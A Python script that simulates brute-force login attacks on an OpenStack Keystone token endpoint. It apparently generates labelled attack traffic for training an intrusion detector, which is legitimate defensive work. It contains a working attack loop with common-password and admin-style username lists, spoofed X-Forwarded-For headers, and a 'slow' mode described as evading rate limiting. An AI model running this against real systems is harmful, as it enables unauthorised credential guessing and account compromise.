#!/usr/bin/env python3
"""
2_attack_brute.py
==================
Simulates Brute Force attacks against Keystone auth endpoint.

Attack pattern:
- High request rate to /v3/auth/tokens
- High fail_rate (wrong passwords)
- Few source IPs, same target endpoint
- Low inter-request time variance (mechanical pattern)

Modes:
  --mode fast   : classic fast brute force (obvious, detectable)
  --mode slow   : low-and-slow (evades rate limiting)
  --mode mixed  : combination (most realistic)
"""

import requests
import time
import random
import csv
import os
import hashlib
import argparse
import json
from datetime import datetime
from config import KEYSTONE_URL, USERS, OUTPUT_DIR, ATTACK_TARGET

os.makedirs(OUTPUT_DIR, exist_ok=True)

AUTH_URL = f"{KEYSTONE_URL}/v3/auth/tokens"

WRONG_PASSWORDS = [
    "password", "123456", "admin123", "letmein", "qwerty",
    "abc123", "monkey", "1234567", "dragon", "master",
    "openstack", "keystone", "cloud123", "test123", "pass123",
    "admin", "root", "toor", "password1", "iloveyou",
    "sunshine", "princess", "welcome", "shadow", "superman",
]

TARGET_USERS = ["admin", "demo", "user1", "user2", "user3",
                "operator", "service", "nova", "neutron"]

LOG_FIELDS = [
    "timestamp", "hour_of_day", "minute_of_hour", "day_of_week",
    "is_business_hours", "http_method", "endpoint_name",
    "endpoint_category", "path_depth", "request_bytes",
    "response_bytes", "status_code", "status_class",
    "response_time_ms", "is_slow_request", "is_auth_endpoint",
    "is_admin_endpoint", "user_id_hash", "has_user_context",
    "req_rate_per_ip_60s", "fail_rate_per_ip_60s",
    "user_req_count_60s", "avg_response_time_recent",
    "has_error_log", "is_burst", "is_repeated_fail",
    "source_ip", "label"
]


class RateTracker:
    def __init__(self):
        self.requests = []
        self.fails    = []
        self.times    = []

    def add(self, ts, success, resp_ms):
        self.requests.append(ts)
        self.times.append((ts, resp_ms))
        if not success:
            self.fails.append(ts)
        cutoff = ts - 60
        self.requests = [t for t in self.requests if t > cutoff]
        self.fails    = [t for t in self.fails    if t > cutoff]
        self.times    = [(t, r) for t, r in self.times if t > cutoff]

    def req_rate(self):
        return len(self.requests)

    def fail_rate(self):
        return len(self.fails) / len(self.requests) if self.requests else 0.0

    def avg_resp(self):
        return sum(r for _, r in self.times) / len(self.times) if self.times else 0.0


def brute_force_request(username, password, source_ip):
    """Send a single brute force authentication attempt."""
    body = {
        "auth": {
            "identity": {
                "methods": ["password"],
                "password": {
                    "user": {
                        "name": username,
                        "password": password,
                        "domain": {"name": "Default"}
                    }
                }
            }
        }
    }
    headers = {
        "Content-Type": "application/json",
        "X-Forwarded-For": source_ip,
    }
    req_bytes = len(json.dumps(body)) + len(str(headers))

    ts_start = time.time()
    try:
        resp       = requests.post(AUTH_URL, json=body, headers=headers, timeout=10)
        resp_ms    = (time.time() - ts_start) * 1000
        status     = resp.status_code
        resp_bytes = len(resp.content)
    except Exception:
        resp_ms    = (time.time() - ts_start) * 1000
        status     = 0
        resp_bytes = 0

    return status, resp_ms, req_bytes, resp_bytes


def simulate_brute_force(target=ATTACK_TARGET, mode="mixed", output_file=None):
    if output_file is None:
        output_file = os.path.join(OUTPUT_DIR, f"raw_brute_{mode}.csv")

    print(f"Brute Force simulation [{mode} mode]")
    print(f"Target: {target} requests → {output_file}\n")

    tracker           = RateTracker()
    rows              = []
    total             = 0
    consecutive_fails = 0
    recent_times      = []

    while total < target:
        username  = random.choice(TARGET_USERS)
        password  = random.choice(WRONG_PASSWORDS)
        source_ip = f"10.0.0.{random.randint(1, 10)}"  # small number of source IPs

        # Determine sleep and burst flag based on mode
        if mode == "fast":
            sleep    = random.uniform(0.05, 0.3)
            is_burst = 1
        elif mode == "slow":
            sleep    = random.uniform(3.0, 15.0)
            is_burst = 0
        else:  # mixed
            if random.random() < 0.6:
                sleep    = random.uniform(0.05, 0.5)
                is_burst = 1
            else:
                sleep    = random.uniform(2.0, 10.0)
                is_burst = 0

        status, resp_ms, req_bytes, resp_bytes = brute_force_request(
            username, password, source_ip)

        success = 200 <= status < 400
        now     = time.time()
        tracker.add(now, success, resp_ms)

        consecutive_fails = consecutive_fails + 1 if not success else 0
        recent_times.append(resp_ms)
        if len(recent_times) > 20:
            recent_times.pop(0)

        dt     = datetime.now()
        hour   = dt.hour
        is_biz = 1 if 9 <= hour <= 18 else 0

        row = {
            "timestamp":                dt.isoformat(),
            "hour_of_day":              hour,
            "minute_of_hour":           dt.minute,
            "day_of_week":              dt.weekday(),
            "is_business_hours":        is_biz,
            "http_method":              2,   # POST
            "endpoint_name":            "auth_tokens",
            "endpoint_category":        1,
            "path_depth":               3,
            "request_bytes":            req_bytes,
            "response_bytes":           resp_bytes,
            "status_code":              status,
            "status_class":             status // 100 if status > 0 else 0,
            "response_time_ms":         round(resp_ms, 2),
            "is_slow_request":          1 if resp_ms > 500 else 0,
            "is_auth_endpoint":         1,
            "is_admin_endpoint":        0,
            "user_id_hash":             int(hashlib.md5(username.encode()).hexdigest()[:8], 16) % 10000,
            "has_user_context":         1,
            "req_rate_per_ip_60s":      tracker.req_rate(),
            "fail_rate_per_ip_60s":     round(tracker.fail_rate(), 4),
            "user_req_count_60s":       tracker.req_rate(),
            "avg_response_time_recent": round(sum(recent_times) / len(recent_times), 2),
            "has_error_log":            1 if status >= 500 else 0,
            "is_burst":                 is_burst,
            "is_repeated_fail":         1 if consecutive_fails >= 3 else 0,
            "source_ip":                source_ip,
            "label":                    1,
        }

        rows.append(row)
        total += 1

        if total % 200 == 0:
            print(f"  [{total}/{target}] "
                  f"fail_rate={tracker.fail_rate():.2%} "
                  f"req_rate={tracker.req_rate()}/60s "
                  f"consecutive_fails={consecutive_fails}")

        time.sleep(sleep)

    with open(output_file, "w", newline="") as f:
        writer = csv.DictWriter(f, fieldnames=LOG_FIELDS)
        writer.writeheader()
        writer.writerows(rows)

    failed = sum(1 for r in rows if not (200 <= r["status_code"] < 400))
    print(f"\n[DONE] {total} requests written → {output_file}")
    print(f"  Failed auth:   {failed} ({failed / total:.1%})")
    print(f"  Max req_rate:  {max(r['req_rate_per_ip_60s'] for r in rows)}/60s")


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Brute force attack simulator")
    parser.add_argument("--target", type=int, default=ATTACK_TARGET)
    parser.add_argument("--mode",   type=str, default="mixed",
                        choices=["fast", "slow", "mixed"])
    parser.add_argument("--output", type=str, default=None)
    args = parser.parse_args()
    simulate_brute_force(target=args.target, mode=args.mode, output_file=args.output)
